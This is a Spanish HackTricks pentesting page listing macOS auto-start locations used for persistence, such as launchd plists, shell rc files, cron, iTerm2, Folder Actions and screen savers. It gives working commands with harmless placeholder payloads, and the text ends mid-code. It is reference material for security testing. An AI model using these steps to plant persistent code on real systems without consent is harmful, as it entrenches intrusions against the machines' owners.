# Ubicaciones de inicio automático en macOS

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* ¿Trabajas en una **empresa de ciberseguridad**? ¿Quieres ver tu **empresa anunciada en HackTricks**? ¿O quieres tener acceso a la **última versión de PEASS o descargar HackTricks en PDF**? ¡Consulta los [**PLANES DE SUSCRIPCIÓN**](https://github.com/sponsors/carlospolop)!
* Descubre [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nuestra colección exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Obtén el [**swag oficial de PEASS y HackTricks**](https://peass.creator-spring.com)
* **Únete al** [**💬**](https://emojipedia.org/speech-balloon/) [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de Telegram**](https://t.me/peass) o **sígueme** en **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Comparte tus trucos de hacking enviando PRs al** [**repositorio de hacktricks**](https://github.com/carlospolop/hacktricks) **y al** [**repositorio de hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

Esta sección se basa en gran medida en la serie de blogs [**Beyond the good ol' LaunchAgents**](https://theevilbit.github.io/beyond/), el objetivo es agregar **más ubicaciones de inicio automático** (si es posible), indicar **qué técnicas siguen funcionando** en la actualidad con la última versión de macOS (13.4) y especificar los **permisos** necesarios.

### Launchd

#### Ubicaciones

* **`/Library/LaunchAgents`**
* **Disparador**: Reinicio
* Se requiere acceso de root
* **`/Library/LaunchDaemons`**
* **Disparador**: Reinicio
* Se requiere acceso de root
* **`/System/Library/LaunchAgents`**
* **Disparador**: Reinicio
* Se requiere acceso de root
* **`/System/Library/LaunchDaemons`**
* **Disparador**: Reinicio
* Se requiere acceso de root
* **`~/Library/LaunchAgents`**
* **Disparador**: Volver a iniciar sesión
* **`~/Library/LaunchDemons`**
* **Disparador**: Volver a iniciar sesión

#### Descripción y carga útil

**`launchd`** es el **primer** **proceso** ejecutado por el kernel de macOS al iniciar y el último en finalizar al apagar. Siempre debe tener el **PID 1**. Este proceso leerá y ejecutará las configuraciones indicadas en los **plists** de **ASEP** en:

* `/Library/LaunchAgents`: Agentes por usuario instalados por el administrador
* `/Library/LaunchDaemons`: Demonios en todo el sistema instalados por el administrador
* `/System/Library/LaunchAgents`: Agentes por usuario proporcionados por Apple.
* `/System/Library/LaunchDaemons`: Demonios en todo el sistema proporcionados por Apple.

Cuando un usuario inicia sesión, los plists ubicados en `/Users/$USER/Library/LaunchAgents` y `/Users/$USER/Library/LaunchDemons` se inician con los **permisos del usuario conectado**.

La **principal diferencia entre agentes y demonios es que los agentes se cargan cuando el usuario inicia sesión y los demonios se cargan al iniciar el sistema** (ya que hay servicios como ssh que deben ejecutarse antes de que cualquier usuario acceda al sistema). Además, los agentes pueden usar la interfaz gráfica mientras que los demonios deben ejecutarse en segundo plano.
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN">
<plist version="1.0">
<dict>
<key>Label</key>
<string>com.apple.someidentifier</string>
<key>ProgramArguments</key>
<array>
<string>bash -c 'touch /tmp/launched'</string> <!--Prog to execute-->
</array>
<key>RunAtLoad</key><true/> <!--Execute at system startup-->
<key>StartInterval</key>
<integer>800</integer> <!--Execute each 800s-->
<key>KeepAlive</key>
<dict>
<key>SuccessfulExit</key></false> <!--Re-execute if exit unsuccessful-->
<!--If previous is true, then re-execute in successful exit-->
</dict>
</dict>
</plist>
```
Hay casos en los que es necesario ejecutar un **agente antes de que el usuario inicie sesión**, estos se llaman **PreLoginAgents**. Por ejemplo, esto es útil para proporcionar tecnología de asistencia al iniciar sesión. También se pueden encontrar en `/Library/LaunchAgents` (ver [**aquí**](https://github.com/HelmutJ/CocoaSampleCode/tree/master/PreLoginAgents) un ejemplo).

{% hint style="info" %}
Los archivos de configuración de los nuevos demonios o agentes se cargarán después del próximo reinicio o utilizando `launchctl load <target.plist>`. También es posible cargar archivos .plist sin esa extensión con `launchctl -F <file>` (sin embargo, esos archivos plist no se cargarán automáticamente después del reinicio).\
También es posible **descargar** con `launchctl unload <target.plist>` (el proceso al que apunta se terminará).

Para **asegurarse** de que no haya **nada** (como una anulación) **impidiendo** que un **Agente** o **Demonio** se **ejecute**, ejecute: `sudo launchctl load -w /System/Library/LaunchDaemos/com.apple.smdb.plist`
{% endhint %}

Lista todos los agentes y demonios cargados por el usuario actual:
```bash
launchctl list
```
### Archivos de inicio de la shell

Descripción: [https://theevilbit.github.io/beyond/beyond\_0001/](https://theevilbit.github.io/beyond/beyond\_0001/)\
Descripción (xterm): [https://theevilbit.github.io/beyond/beyond\_0018/](https://theevilbit.github.io/beyond/beyond\_0018/)

#### Ubicaciones

* **`~/.zshrc`, `~/.zlogin`, `~/.zshenv`, `~/.zprofile`**
* **Disparador**: Abrir una terminal con zsh
* **`/etc/zshenv`, `/etc/zprofile`, `/etc/zshrc`, `/etc/zlogin`**
* **Disparador**: Abrir una terminal con zsh
* Se requiere acceso de root
* **`~/.zlogout`**
* **Disparador**: Salir de una terminal con zsh
* **`/etc/zlogout`**
* **Disparador**: Salir de una terminal con zsh
* Se requiere acceso de root
* Potencialmente más en: **`man zsh`**
* **`~/.bashrc`**
* **Disparador**: Abrir una terminal con bash
* `/etc/profile` (no funcionó)
* `~/.profile` (no funcionó)
* `~/.xinitrc`, `~/.xserverrc`, `/opt/X11/etc/X11/xinit/xinitrc.d/`
* **Disparador**: Se espera que se active con xterm, pero **no está instalado** y, incluso después de instalarlo, se produce este error: xterm: `DISPLAY no está configurado`

#### Descripción

Los archivos de inicio de la shell se ejecutan cuando nuestro entorno de shell como `zsh` o `bash` se está **iniciando**. En macOS, el valor predeterminado es `/bin/zsh`, y cada vez que abrimos `Terminal` o nos conectamos por SSH al dispositivo, este es el entorno de shell en el que nos encontramos. `bash` y `sh` todavía están disponibles, pero deben iniciarse específicamente.

La página de manual de zsh, que podemos leer con **`man zsh`**, tiene una descripción detallada de los archivos de inicio.
```bash
# Example executino via ~/.zshrc
echo "touch /tmp/hacktricks" >> ~/.zshrc
```
### iTerm2

Descripción: [https://theevilbit.github.io/beyond/beyond\_0002/](https://theevilbit.github.io/beyond/beyond\_0002/)

#### Ubicaciones

* **`~/Library/Application Support/iTerm2/Scripts/AutoLaunch`**
* **Disparador**: Abrir iTerm
* **`~/Library/Application Support/iTerm2/Scripts/AutoLaunch.scpt`**
* **Disparador**: Abrir iTerm
* **`~/Library/Preferences/com.googlecode.iterm2.plist`**
* **Disparador**: Abrir iTerm

#### Descripción

Los scripts almacenados en **`~/Library/Application Support/iTerm2/Scripts/AutoLaunch`** se ejecutarán. Por ejemplo:
```bash
cat > "$HOME/Library/Application Support/iTerm2/Scripts/AutoLaunch/a.sh" << EOF
#!/bin/bash
touch /tmp/iterm2-autolaunch
EOF

chmod +x "$HOME/Library/Application Support/iTerm2/Scripts/AutoLaunch/a.sh"
```
El script **`~/Library/Application Support/iTerm2/Scripts/AutoLaunch.scpt`** también se ejecutará:
```bash
do shell script "touch /tmp/iterm2-autolaunchscpt"
```
Las preferencias de iTerm2 se encuentran en **`~/Library/Preferences/com.googlecode.iterm2.plist`** y pueden **indicar un comando a ejecutar** cuando se abre la terminal de iTerm2.

Esta configuración se puede ajustar en la configuración de iTerm2:

<figure><img src="../.gitbook/assets/image.png" alt="" width="563"><figcaption></figcaption></figure>

Y el comando se refleja en las preferencias:
```bash
plutil -p com.googlecode.iterm2.plist
{
[...]
"New Bookmarks" => [
0 => {
[...]
"Initial Text" => "touch /tmp/iterm-start-command"
```
Puedes configurar el comando a ejecutar con:

{% code overflow="wrap" %}
```bash
# Add
/usr/libexec/PlistBuddy -c "Set :\"New Bookmarks\":0:\"Initial Text\" 'touch /tmp/iterm-start-command'" $HOME/Library/Preferences/com.googlecode.iterm2.plist

# Remove
/usr/libexec/PlistBuddy -c "Set :\"New Bookmarks\":0:\"Initial Text\" ''" $HOME/Library/Preferences/com.googlecode.iterm2.plist
```
{% endcode %}

{% hint style="warning" %}
Es muy probable que haya **otras formas de abusar de las preferencias de iTerm2** para ejecutar comandos arbitrarios.
{% endhint %}

### Aplicaciones reabiertas

**Descripción**: [https://theevilbit.github.io/beyond/beyond\_0021/](https://theevilbit.github.io/beyond/beyond\_0021/)

#### Ubicación

* **`~/Library/Preferences/ByHost/com.apple.loginwindow.<UUID>.plist`**
* **Disparador**: Reiniciar la reapertura de aplicaciones

#### Descripción y explotación

Todas las aplicaciones a reabrir se encuentran dentro del archivo plist `~/Library/Preferences/ByHost/com.apple.loginwindow.<UUID>.plist`

Por lo tanto, para hacer que las aplicaciones reabiertas ejecuten tu propia aplicación, solo necesitas **agregar tu aplicación a la lista**.

El UUID se puede encontrar listando ese directorio o con `ioreg -rd1 -c IOPlatformExpertDevice | awk -F'"' '/IOPlatformUUID/{print $4}'`

Para verificar las aplicaciones que se reabrirán, puedes hacer lo siguiente:
```bash
defaults -currentHost read com.apple.loginwindow TALAppsToRelaunchAtLogin
#or
plutil -p ~/Library/Preferences/ByHost/com.apple.loginwindow.<UUID>.plist
```
Para **agregar una aplicación a esta lista** puedes usar:
```bash
# Adding iTerm2
/usr/libexec/PlistBuddy -c "Add :TALAppsToRelaunchAtLogin: dict" \
-c "Set :TALAppsToRelaunchAtLogin:$:BackgroundState 2" \
-c "Set :TALAppsToRelaunchAtLogin:$:BundleID com.googlecode.iterm2" \
-c "Set :TALAppsToRelaunchAtLogin:$:Hide 0" \
-c "Set :TALAppsToRelaunchAtLogin:$:Path /Applications/iTerm.app" \
~/Library/Preferences/ByHost/com.apple.loginwindow.<UUID>.plist
```
{% hint style="danger" %}
Agregar la sección anterior y cerrar sesión e iniciar sesión o incluso reiniciar no funcionó para ejecutar la aplicación. (La aplicación no se estaba ejecutando, tal vez necesita estar en ejecución cuando se realizan estas acciones)
{% endhint %}

### Cron

**Descripción**: [https://theevilbit.github.io/beyond/beyond\_0004/](https://theevilbit.github.io/beyond/beyond\_0004/)

#### Ubicación

* **`/usr/lib/cron/tabs/`, `/private/var/at/tabs`, `/private/var/at/jobs`, `/etc/periodic/`**
* Se requiere acceso de escritura directa de root. No se requiere root si puedes ejecutar `crontab <archivo>`
* **Disparador**: Depende del trabajo cron

#### Descripción y Exploit

Lista los trabajos cron del **usuario actual** con:
```bash
crontab -l
```
También puedes ver todos los trabajos cron de los usuarios en **`/usr/lib/cron/tabs/`** y **`/var/at/tabs/`** (necesita privilegios de root).

En MacOS se pueden encontrar varias carpetas que ejecutan scripts con **cierta frecuencia** en:
```bash
ls -lR /usr/lib/cron/tabs/ /private/var/at/jobs /etc/periodic/
```
Aquí puedes encontrar las tareas regulares de **cron**, las tareas de **at** (poco utilizadas) y las tareas **periódicas** (principalmente utilizadas para limpiar archivos temporales). Las tareas periódicas diarias se pueden ejecutar, por ejemplo, con: `periodic daily`.

Para agregar una tarea de **cronjob de usuario programáticamente**, es posible utilizar:
```bash
echo '* * * * * /bin/bash -c "touch /tmp/cron3"' > /tmp/cron
crontab /tmp/cron
```
### Periódico

Descripción y Exploit

Los scripts periódicos (**`/etc/periodic`**) se ejecutan debido a los **launch daemons** configurados en `/System/Library/LaunchDaemons/com.apple.periodic*`. Tenga en cuenta que los scripts almacenados en `/etc/periodic/` se **ejecutan** como el **propietario del archivo**, por lo que esto no funcionará para una posible escalada de privilegios.

{% code overflow="wrap" %}
```bash
# Launch daemons that will execute the periodic scripts
ls -l /System/Library/LaunchDaemons/com.apple.periodic*
-rw-r--r--  1 root  wheel  887 May 13 00:29 /System/Library/LaunchDaemons/com.apple.periodic-daily.plist
-rw-r--r--  1 root  wheel  895 May 13 00:29 /System/Library/LaunchDaemons/com.apple.periodic-monthly.plist
-rw-r--r--  1 root  wheel  891 May 13 00:29 /System/Library/LaunchDaemons/com.apple.periodic-weekly.plist

# The scripts located in their locations
ls -lR /etc/periodic
total 0
drwxr-xr-x  11 root  wheel  352 May 13 00:29 daily
drwxr-xr-x   5 root  wheel  160 May 13 00:29 monthly
drwxr-xr-x   3 root  wheel   96 May 13 00:29 weekly

/etc/periodic/daily:
total 72
-rwxr-xr-x  1 root  wheel  1642 May 13 00:29 110.clean-tmps
-rwxr-xr-x  1 root  wheel   695 May 13 00:29 130.clean-msgs
[...]

/etc/periodic/monthly:
total 24
-rwxr-xr-x  1 root  wheel   888 May 13 00:29 199.rotate-fax
-rwxr-xr-x  1 root  wheel  1010 May 13 00:29 200.accounting
-rwxr-xr-x  1 root  wheel   606 May 13 00:29 999.local

/etc/periodic/weekly:
total 8
-rwxr-xr-x  1 root  wheel  620 May 13 00:29 999.local
```
{% endcode %}

Hay otros scripts periódicos que se ejecutarán según lo indicado en **`/etc/defaults/periodic.conf`**:
```bash
grep "Local scripts" /etc/defaults/periodic.conf
daily_local="/etc/daily.local"				# Local scripts
weekly_local="/etc/weekly.local"			# Local scripts
monthly_local="/etc/monthly.local"			# Local scripts
```
Si logras escribir alguno de los archivos `/etc/daily.local`, `/etc/weekly.local` o `/etc/monthly.local`, se ejecutará tarde o temprano.

### PAM

Descripción: [Linux Hacktricks PAM](../linux-hardening/linux-post-exploitation/pam-pluggable-authentication-modules.md)\
Descripción: [https://theevilbit.github.io/beyond/beyond\_0005/](https://theevilbit.github.io/beyond/beyond\_0005/)

#### Ubicación

* Siempre se requiere acceso de root

#### Descripción

Dado que PAM se centra más en la persistencia y en el malware que en la ejecución fácil dentro de macOS, este blog no proporcionará una explicación detallada, **lee las descripciones para entender mejor esta técnica**.

### SSHRC

Descripción: [https://theevilbit.github.io/beyond/beyond\_0006/](https://theevilbit.github.io/beyond/beyond\_0006/)

#### Ubicación

* **`~/.ssh/rc`**
* **Disparador**: Inicio de sesión a través de SSH
* **`/etc/ssh/sshrc`**
* Se requiere acceso de root
* **Disparador**: Inicio de sesión a través de SSH

#### Descripción

De forma predeterminada, a menos que se establezca `PermitUserRC no` en `/etc/ssh/sshd_config`, cuando un usuario **inicia sesión a través de SSH**, se ejecutarán los scripts **`/etc/ssh/sshrc`** y **`~/.ssh/rc`**.

### xbar

Descripción: [https://theevilbit.github.io/beyond/beyond\_0007/](https://theevilbit.github.io/beyond/beyond\_0007/)

#### Ubicación

* **`~/Library/Application\ Support/xbar/plugins/`**
* **Disparador**: Una vez que se ejecuta xbar

#### Descripción

Si está instalado el programa popular [**xbar**](https://github.com/matryer/xbar), es posible escribir un script de shell en **`~/Library/Application\ Support/xbar/plugins/`** que se ejecutará cuando se inicie xbar:
```bash
cat > "$HOME/Library/Application Support/xbar/plugins/a.sh" << EOF
#!/bin/bash
touch /tmp/xbar
EOF
chmod +x "$HOME/Library/Application Support/xbar/plugins/a.sh"
```
### Hammerspoon

**Descripción**: [https://theevilbit.github.io/beyond/beyond\_0008/](https://theevilbit.github.io/beyond/beyond\_0008/)

#### Ubicación

* **`~/.hammerspoon/init.lua`**
* **Disparador**: Una vez que Hammerspoon es ejecutado

#### Descripción

[Hammerspoon](https://github.com/Hammerspoon/hammerspoon) es una herramienta de automatización que permite la escritura de scripts en macOS utilizando el lenguaje de programación LUA. Incluso podemos incrustar código completo de AppleScript y ejecutar scripts de shell.

La aplicación busca un único archivo, `~/.hammerspoon/init.lua`, y cuando se inicia, el script será ejecutado.
```bash
cat > "$HOME/.hammerspoon/init.lua" << EOF
hs.execute("id > /tmp/hs.txt")
EOF
```
### Panel de preferencias

Descripción: [https://theevilbit.github.io/beyond/beyond\_0009/](https://theevilbit.github.io/beyond/beyond\_0009/)

#### Ubicación

* **`/System/Library/PreferencePanes`**
* **`/Library/PreferencePanes`**
* **`~/Library/PreferencePanes`**

#### Descripción

Parece que esto ya no funciona.

### Importadores de Spotlight

Descripción: [https://theevilbit.github.io/beyond/beyond\_0011/](https://theevilbit.github.io/beyond/beyond\_0011/)

#### Ubicación

* **`/Library/Spotlight`**&#x20;
* **`~/Library/Spotlight`**

#### Descripción

Terminarás en un **sandbox pesado**, así que probablemente no quieras usar esta técnica.

### Plugins de audio

Descripción: [https://theevilbit.github.io/beyond/beyond\_0013/](https://theevilbit.github.io/beyond/beyond\_0013/)\
Descripción: [https://posts.specterops.io/audio-unit-plug-ins-896d3434a882](https://posts.specterops.io/audio-unit-plug-ins-896d3434a882)

#### Ubicación

* **`/Library/Audio/Plug-Ins/HAL`**
* Se requieren permisos de root
* **Desencadenar**: Reiniciar coreaudiod o la computadora
* **`/Library/Audio/Plug-ins/Components`**
* Se requieren permisos de root
* **Desencadenar**: Reiniciar coreaudiod o la computadora
* **`~/Library/Audio/Plug-ins/Components`**
* **Desencadenar**: Reiniciar coreaudiod o la computadora
* **`/System/Library/Components`**
* Se requieren permisos de root
* **Desencadenar**: Reiniciar coreaudiod o la computadora

#### Descripción

Según los escritos anteriores, es posible **compilar algunos plugins de audio** y cargarlos.&#x20;

### Acciones de carpeta

Descripción: [https://theevilbit.github.io/beyond/beyond\_0024/](https://theevilbit.github.io/beyond/beyond\_0024/)\
Descripción: [https://posts.specterops.io/folder-actions-for-persistence-on-macos-8923f222343d](https://posts.specterops.io/folder-actions-for-persistence-on-macos-8923f222343d)

#### Ubicación

* `/Library/Scripts/Folder Action Scripts`
* Se requieren permisos de root
* `~/Library/Scripts/Folder Action Scripts`

#### Descripción y explotación

Un script de Acción de Carpeta se ejecuta cuando se agregan o eliminan elementos en la carpeta a la que está adjunto, o cuando su ventana se abre, cierra, mueve o cambia de tamaño:

* Abrir la carpeta a través de la interfaz de usuario del Finder
* Agregar un archivo a la carpeta (se puede hacer arrastrando y soltando o incluso desde un símbolo del terminal)
* Eliminar un archivo de la carpeta (se puede hacer arrastrando y soltando o incluso desde un símbolo del terminal)
* Navegar fuera de la carpeta a través de la interfaz de usuario

Hay un par de formas de implementar esto:

1. Usar el programa [Automator](https://support.apple.com/guide/automator/welcome/mac) para crear un archivo de flujo de trabajo de Acción de Carpeta (.workflow) e instalarlo como un servicio.
2. Hacer clic derecho en una carpeta, seleccionar `Configuración de Acciones de Carpeta...`, `Ejecutar servicio` y adjuntar manualmente un script.
3. Usar OSAScript para enviar mensajes de Evento Apple a la aplicación `System Events.app` para consultar y registrar programáticamente una nueva `Acción de Carpeta`.

* Esta es la forma de implementar persistencia utilizando un OSAScript para enviar mensajes de Evento Apple a `System Events.app`

Este es el script que se ejecutará:

{% code title="source.js" %}
```applescript
var app = Application.currentApplication();
app.includeStandardAdditions = true;
app.doShellScript("touch /tmp/folderaction.txt");
app.doShellScript("touch ~/Desktop/folderaction.txt");
app.doShellScript("mkdir /tmp/asd123");
app.doShellScript("cp -R ~/Desktop /tmp/asd123");
```
{% endcode %}

Compílalo con: `osacompile -l JavaScript -o folder.scpt source.js`

Luego ejecuta el siguiente script para habilitar las Acciones de Carpeta y adjuntar el script compilado previamente a la carpeta **`/users/username/Desktop`**:
```javascript
var se = Application("System Events");
se.folderActionsEnabled = true;
var myScript = se.Script({name: "source.js", posixPath: "/tmp/source.js"});
var fa = se.FolderAction({name: "Desktop", path: "/Users/username/Desktop"});
se.folderActions.push(fa);
fa.scripts.push(myScript);
```
Ejecuta el script con: `osascript -l JavaScript /Users/carlospolop/attach.scpt`



* Esta es la forma de implementar esta persistencia a través de la GUI:

Este es el script que se ejecutará:

{% code title="source.js" %}
```applescript
var app = Application.currentApplication();
app.includeStandardAdditions = true;
app.doShellScript("touch /tmp/folderaction.txt");
app.doShellScript("touch ~/Desktop/folderaction.txt");
app.doShellScript("mkdir /tmp/asd123");
app.doShellScript("cp -R ~/Desktop /tmp/asd123");
```
{% endcode %}

Compílalo con: `osacompile -l JavaScript -o folder.scpt source.js`

Muévelo a:
```bash
mkdir -p "$HOME/Library/Scripts/Folder Action Scripts"
mv /tmp/folder.scpt "$HOME/Library/Scripts/Folder Action Scripts"
```
Luego, abre la aplicación `Folder Actions Setup`, selecciona la **carpeta que deseas vigilar** y selecciona en tu caso **`folder.scpt`** (en mi caso lo llamé output2.scp):

<figure><img src="../.gitbook/assets/image (2).png" alt="" width="297"><figcaption></figcaption></figure>

Ahora, si abres esa carpeta con **Finder**, tu script se ejecutará.

Esta configuración se almacenó en el **plist** ubicado en **`~/Library/Preferences/com.apple.FolderActionsDispatcher.plist`** en formato base64.

Ahora, intentemos preparar esta persistencia sin acceso a la GUI:

1. **Copia `~/Library/Preferences/com.apple.FolderActionsDispatcher.plist`** a `/tmp` para hacer una copia de seguridad:
* `cp ~/Library/Preferences/com.apple.FolderActionsDispatcher.plist /tmp`
2. **Elimina** las Folder Actions que acabas de configurar:

<figure><img src="../.gitbook/assets/image (3).png" alt=""><figcaption></figcaption></figure>

Ahora que tenemos un entorno vacío

3. Copia el archivo de respaldo: `cp /tmp/com.apple.FolderActionsDispatcher.plist ~/Library/Preferences/`
4. Abre la aplicación Folder Actions Setup.app para consumir esta configuración: `open "/System/Library/CoreServices/Applications/Folder Actions Setup.app/"`

{% hint style="danger" %}
Y esto no funcionó para mí, pero esas son las instrucciones del informe:(
{% endhint %}

### Accesos directos del Dock

Informe: [https://theevilbit.github.io/beyond/beyond\_0027/](https://theevilbit.github.io/beyond/beyond\_0027/)

#### Ubicación

* `~/Library/Preferences/com.apple.dock.plist`
* **Disparador**: Cuando el usuario hace clic en la aplicación dentro del Dock

#### Descripción y Explotación

Todas las aplicaciones que aparecen en el Dock se especifican dentro del plist: **`~/Library/Preferences/com.apple.dock.plist`**

Es posible **agregar una aplicación** simplemente con:

{% code overflow="wrap" %}
```bash
# Add /System/Applications/Books.app
defaults write com.apple.dock persistent-apps -array-add '<dict><key>tile-data</key><dict><key>file-data</key><dict><key>_CFURLString</key><string>/System/Applications/Books.app</string><key>_CFURLStringType</key><integer>0</integer></dict></dict></dict>'

# Restart Dock
killall Dock
```
{% endcode %}

### emond

Descripción: [https://theevilbit.github.io/beyond/beyond\_0023/](https://theevilbit.github.io/beyond/beyond\_0023/)

No puedo encontrar este componente en mi macOS, así que para obtener más información, consulta la descripción.

### Plugins de QuickLook

Descripción: [https://theevilbit.github.io/beyond/beyond\_0028/](https://theevilbit.github.io/beyond/beyond\_0028/)

#### Ubicación

* `/System/Library/QuickLook`
* `/Library/QuickLook`
* `~/Library/QuickLook`
* `/Applications/AppNameHere/Contents/Library/QuickLook/`
* `~/Applications/AppNameHere/Contents/Library/QuickLook/`

#### Descripción y Explotación

Los plugins de QuickLook se pueden ejecutar cuando **se activa la vista previa de un archivo** (presionando la barra espaciadora con el archivo seleccionado en Finder) y se instala un **plugin que admite ese tipo de archivo**.

Es posible compilar tu propio plugin de QuickLook, colocarlo en una de las ubicaciones anteriores para cargarlo y luego ir a un archivo compatible y presionar espacio para activarlo.

### Plugins de Autorización

Descripción: [https://theevilbit.github.io/beyond/beyond\_0028/](https://theevilbit.github.io/beyond/beyond\_0028/)\
Descripción: [https://posts.specterops.io/persistent-credential-theft-with-authorization-plugins-d17b34719d65](https://posts.specterops.io/persistent-credential-theft-with-authorization-plugins-d17b34719d65)

#### Ubicación

* `/Library/Security/SecurityAgentPlugins/`
* Se requiere acceso de root
* También se necesita&#x20;

#### Descripción y Explotación

Por hacer

### Selectores de Color

Descripción: [https://theevilbit.github.io/beyond/beyond\_0017](https://theevilbit.github.io/beyond/beyond\_0017/)

#### Ubicación

* `/Library/ColorPickers`&#x20;
* Se requiere acceso de root
* Activación: Usar el selector de color
* `~/Library/ColorPickers`
* Activación: Usar el selector de color

#### Descripción y Explotación

**Compila un paquete de selector de color** con tu código (puedes usar [**este, por ejemplo**](https://github.com/viktorstrate/color-picker-plus)) y agrega un constructor (como en la sección [Protector de pantalla](macos-auto-start-locations.md#screen-saver)) y copia el paquete a `~/Library/ColorPickers`.

Luego, cuando se active el selector de color, tu código también debería ejecutarse.

Ten en cuenta que el binario que carga tu biblioteca tiene un **sandbox muy restrictivo**: `/System/Library/Frameworks/AppKit.framework/Versions/C/XPCServices/LegacyExternalColorPickerService-x86_64.xpc/Contents/MacOS/LegacyExternalColorPickerService-x86_64`

{% code overflow="wrap" %}
```bash
[Key] com.apple.security.temporary-exception.sbpl
[Value]
[Array]
[String] (deny file-write* (home-subpath "/Library/Colors"))
[String] (allow file-read* process-exec file-map-executable (home-subpath "/Library/ColorPickers"))
[String] (allow file-read* (extension "com.apple.app-sandbox.read"))
```
{% endcode %}

### XQuartz

Descripción: [https://theevilbit.github.io/beyond/beyond\_0018/](https://theevilbit.github.io/beyond/beyond\_0018/)

#### Ubicación

* **`/opt/X11/etc/X11/xinit/privileged_startx.d`**
* Se requiere acceso de root
* **Disparador**: Con XQuartz

#### Descripción y Exploit

XQuartz ya **no está instalado en macOS**, así que si quieres más información, consulta la descripción.

### kext

Para instalar un KEXT como elemento de inicio, debe estar **instalado en una de las siguientes ubicaciones**:

* `/System/Library/Extensions`
* Archivos KEXT integrados en el sistema operativo OS X.
* `/Library/Extensions`
* Archivos KEXT instalados por software de terceros

Puedes listar los archivos kext cargados actualmente con:
```bash
kextstat #List loaded kext
kextload /path/to/kext.kext #Load a new one based on path
kextload -b com.apple.driver.ExampleBundle #Load a new one based on path
kextunload /path/to/kext.kext
kextunload -b com.apple.driver.ExampleBundle
```
Para obtener más información sobre las [extensiones del kernel, consulta esta sección](macos-security-and-privilege-escalation/mac-os-architecture#i-o-kit-drivers).

### amstoold

Descripción: [https://theevilbit.github.io/beyond/beyond\_0029/](https://theevilbit.github.io/beyond/beyond\_0029/)

#### Ubicación

* **`/usr/local/bin/amstoold`**
* Se requiere acceso de root

#### Descripción y explotación

Aparentemente, el archivo `plist` de `/System/Library/LaunchAgents/com.apple.amstoold.plist` estaba utilizando este binario mientras exponía un servicio XPC... el problema es que el binario no existía, por lo que podías colocar algo allí y cuando se llamara al servicio XPC, se llamaría a tu binario.

Ya no puedo encontrar esto en mi macOS.

### xsanctl

Descripción: [https://theevilbit.github.io/beyond/beyond\_0015/](https://theevilbit.github.io/beyond/beyond\_0015/)

#### Ubicación

* **`/Library/Preferences/Xsan/.xsanrc`**
* Se requiere acceso de root
* **Disparador**: Cuando se ejecuta el servicio (raramente)

#### Descripción y explotación

Aparentemente, no es muy común ejecutar este script e incluso no pude encontrarlo en mi macOS, así que si quieres más información, consulta el artículo.

### Protector de pantalla

Descripción: [https://theevilbit.github.io/beyond/beyond\_0016/](https://theevilbit.github.io/beyond/beyond\_0016/)\
Descripción: [https://posts.specterops.io/saving-your-access-d562bf5bf90b](https://posts.specterops.io/saving-your-access-d562bf5bf90b)

#### Ubicación

* `/System/Library/Screen Savers`&#x20;
* Se requiere acceso de root
* **Disparador**: Seleccionar el protector de pantalla
* `/Library/Screen Savers`
* Se requiere acceso de root
* **Disparador**: Seleccionar el protector de pantalla
* `~/Library/Screen Savers`
* **Disparador**: Seleccionar el protector de pantalla

<figure><img src="../.gitbook/assets/image (1).png" alt="" width="375"><figcaption></figcaption></figure>

#### Descripción y explotación

Crea un nuevo proyecto en Xcode y selecciona la plantilla para generar un nuevo **protector de pantalla**. Luego, agrega tu código, por ejemplo, el siguiente código para generar registros.

**Compílalo** y copia el paquete `.saver` en **`~/Library/Screen Savers`**. Luego, abre la interfaz gráfica del protector de pantalla y si haces clic en él, debería generar muchos registros:

{% code overflow="wrap" %}
```bash
sudo log stream --style syslog --predicate 'eventMessage CONTAINS[c] "hello_screensaver"'

Timestamp                       (process)[PID]
2023-09-27 22:55:39.622369+0200  localhost legacyScreenSaver[41737]: (ScreenSaverExample) hello_screensaver void custom(int, const char **)
2023-09-27 22:55:39.622623+0200  localhost legacyScreenSaver[41737]: (ScreenSaverExample) hello_screensaver -[ScreenSaverExampleView initWithFrame:isPreview:]
2023-09-27 22:55:39.622704+0200  localhost legacyScreenSaver[41737]: (ScreenSaverExample) hello_screensaver -[ScreenSaverExampleView hasConfigureSheet]
```
{% endcode %}

{% hint style="danger" %}
Ten en cuenta que debido a que dentro de los permisos del binario que carga este código (`/System/Library/Frameworks/ScreenSaver.framework/PlugIns/legacyScreenSaver.appex/Contents/MacOS/legacyScreenSaver`) puedes encontrar **`com.apple.security.app-sandbox`** estarás **dentro del sandbox de la aplicación común**.
{% endhint %}

Código del protector de pantalla:
```objectivec
//
//  ScreenSaverExampleView.m
//  ScreenSaverExample
//
//  Created by Carlos Polop on 27/9/23.
//

#import "ScreenSaverExampleView.h"

@implementation ScreenSaverExampleView

- (instancetype)initWithFrame:(NSRect)frame isPreview:(BOOL)isPreview
{
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
self = [super initWithFrame:frame isPreview:isPreview];
if (self) {
[self setAnimationTimeInterval:1/30.0];
}
return self;
}

- (void)startAnimation
{
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
[super startAnimation];
}

- (void)stopAnimation
{
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
[super stopAnimation];
}

- (void)drawRect:(NSRect)rect
{
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
[super drawRect:rect];
}

- (void)animateOneFrame
{
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
return;
}

- (BOOL)hasConfigureSheet
{
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
return NO;
}

- (NSWindow*)configureSheet
{
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
return nil;
}

